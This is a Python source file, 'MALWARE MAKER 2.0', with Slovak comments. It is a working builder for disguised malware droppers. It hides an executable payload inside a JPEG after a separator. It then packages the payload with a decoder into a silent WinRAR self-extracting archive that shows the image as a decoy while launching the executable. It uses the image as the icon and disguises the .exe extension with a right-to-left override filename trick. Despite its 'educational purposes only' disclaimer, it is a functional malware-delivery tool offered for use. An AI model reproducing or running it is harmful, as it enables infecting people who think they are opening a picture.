import subprocess
import os
import time

from PIL import Image


def makeMalware(winrar_path, current_directory, input_folder, output_folder):
    print("\nCreating malware...")

    # Názvy súborov do SFX archívu
    executable_file = os.path.join(input_folder, "decoder.exe")
    image_file = os.path.join(input_folder, "complexe.jpg")

    # Kontrola
    if not (os.path.exists(executable_file) and os.path.exists(image_file)):
        print("ERROR: Dependencies not found - check if decoder.exe and complexe.jpg are present in the input folder\n")
        return

    # Vytvorenie ICO súboru
    icon = Image.open(image_file)
    icon.save("./input/file.ico", format="ICO", quality=95)
    icon_path = os.path.join(input_folder, "file.ico")

    # Tento archív sa vytvorí
    output_sfx_archive = os.path.join(output_folder, "output.exe")

    # Config súbor
    config_file_path = os.path.join(current_directory, "winrar_config.txt")
    with open(config_file_path, 'w') as config_file:
        config_file.write("TempMode\n")         # Dočasný režim
        config_file.write("Silent=1\n")         # Tichý režim
        config_file.write("Setup=complexe.jpg\n")   # Súbor na spustenie po extrakcii
        config_file.write("Setup=cmd /c start /b decoder.exe\n")
        #config_file.write("Setup=cmd /c start decoder.exe\n")

    # Vytvorenie archívu s konfiguračným súborom
    command = [
        winrar_path,
        'a',                            # Pridať do archivu
        '-afzip',                       # Formát
        '-sfx',                         # Vytvoriť SFX archiv
        '-iicon{}'.format(icon_path),   # Cesta k ikone
        '-m5',                          # Úroveň kompresie
        '-t',                           # Nastaviť dočasný režim
        '-y',                           # Potvrdit prepisovanie súborov
        '-ibck',                        # Skryť varovné správy
        '-s',                           # Tichý režim
        '-ep1',
        '-z{}'.format(config_file_path),  # Konfigurák
        output_sfx_archive,               # Názov archívu - bude sa meniť
        executable_file,                  # Cesta k exe súboru
        image_file
    ]

    # Vytvorenie archívu, odstránenie konfiguráku
    try:
        subprocess.run(command, cwd=current_directory)
        os.remove(config_file_path)
    except Exception as e:
        print(f"\nERROR: An error occured while running a WinRAR command - error: {e}\n")
        return

    # Zmena mena súboru
    stary_subor = os.path.join(output_folder, "output.exe")
    nove_meno = os.path.join(output_folder, f"compl‮gpj.exe")
    if os.path.exists(nove_meno):
        os.remove(nove_meno)
        print("...removing old malware")
    os.rename(stary_subor, nove_meno)

    print("\nMalware creation complete!\n")

    return


def read_binary_file(src):
    with open(src, 'rb') as file:
        binary_data = file.read()
        return binary_data


def save_binary_data_to_image(binary_data, output_src):
    with open(output_src, 'wb') as file:
        file.write(binary_data)
        print("...binary data saved")


def append_data_to_file(binary_data, src):
    with open(src, 'ab') as file:
        file.write(binary_data)
        print("...separator appended to the file")


def save_data_to_file(data, output_file):
    with open(output_file, 'wb') as file:
        file.write(data)


def encode_image(input_folder):
    print("\nEncoding image...")

    secret_file = os.path.join(input_folder, "code.exe")
    original_image_path = os.path.join(input_folder, "file.jpg")
    output_image_path = os.path.join(input_folder, "complexe.jpg")

    # Kontrola
    if not (os.path.exists(original_image_path) and os.path.exists(secret_file)):
        print("ERROR: Dependencies not found - check if code.exe and file.jpg are present in the input folder\n")
        return

    binary_data = read_binary_file(original_image_path)
    save_binary_data_to_image(binary_data, output_image_path)

    # Oddelovač medzi obrázkom a pridanými dátami
    separator = b'EndOfImage'
    append_data_to_file(separator, output_image_path)

    data_to_append = read_binary_file(secret_file)
    append_data_to_file(data_to_append, output_image_path)

    print(f"Image encoded successfully and saved to {output_image_path}\n")


def decode_image(input_folder):
    encoded_image_path = os.path.join(input_folder, "complexe.jpg")
    output_file_path = "exploit.exe"

    print("Decoding image...")

    with open(encoded_image_path, 'rb') as file:
        binary_data = file.read()

    separator = b'EndOfImage'
    image_data, added_data = binary_data.split(separator, 1)
    save_data_to_file(added_data, output_file_path)


def printInstructions():
    print("\n----------------- Instructions -----------------\n")
    print("----------------- STEP 1: Encode payload to image file")
    print("Into the input folder, insert cover image named file.jpg and malware code named code.exe")
    print("Run the command from menu (by pressing A)")
    print("After running the command, file.ico and complexe.jpg (stego image) will be created in the input folder")

    print("\n----------------- STEP 2: Create malware from encoded image file")
    print("If decoder.exe and complexe.jpg are present in the input folder, this command can be used")
    print("Run the command from menu (by pressing B)")
    print("After running the command, executable malware named complexe.jpg will be created in the output folder")

    input("\n...press any key to continue ")
    print("")


def main():
    # Cesta k exe souboru WinRAR
    winrar_path = r'C:\Program Files\WinRAR\WinRAR.exe'

    check = 1
    while check:
        if not (os.path.exists(winrar_path) and os.path.basename(winrar_path) == "WinRAR.exe"):
            print("ERROR: WinRAR not found - please enter correct full path to WinRAR.exe (C:\....)")
            winrar_path = input("---> ")
        else:
            check = 0

    # Priečinky
    current_directory = os.path.dirname(os.path.abspath(__file__))
    output_folder = os.path.join(current_directory, "output")
    os.makedirs(output_folder, exist_ok=True)
    input_folder = os.path.join(current_directory, "input")
    os.makedirs(input_folder, exist_ok=True)

    print("\n----------------- MALWARE MAKER 2.0 -----------------\n")
    print("DISCLAIMER! This program has been created for educational purposes only.\nThe author does not endorse or encourage any malicious activities. The use of this software for any illegal or unethical activities is strictly prohibited. \nThe author is not responsible for any misuse or damage caused by the program. Users are advised to adhere to applicable laws and ethical guidelines. \nBy using this software, you agree to use it responsibly and in compliance with all relevant laws and regulations.")
    print("This program is capable of creating files that may be detected as malicious by security software. Use at your own risk.")

    print("\nBy continuing, you agree to adhere to the rules in disclaimer written heretofore.")
    input("...press any key to start ")
    print("\n----------------------- Menu ------------------------\n")

    cont = 1
    while cont:
        print("To encode payload to image file ............. press A")
        print("To create malware from encoded image file ... press B")
        print("To print instructions ....................... press C")
        print("To exit ..................................... press X")

        choice = input("---> ")

        if choice.upper() == "A":
            encode_image(input_folder)
            print("\n----------------------- Menu ------------------------\n")
        elif choice.upper() == "B":
            makeMalware(winrar_path, current_directory, input_folder, output_folder)
            print("\n----------------------- Menu ------------------------\n")
        elif choice.upper() == "C":
            printInstructions()
            print("\n----------------------- Menu ------------------------\n")
        elif choice.upper() == "X":
            print("Exiting program")
            cont = 0
        else:
            print("Unknown command - please try again")
            print("\n----------------------- Menu ------------------------\n")

    return


if __name__ == "__main__":
    main()
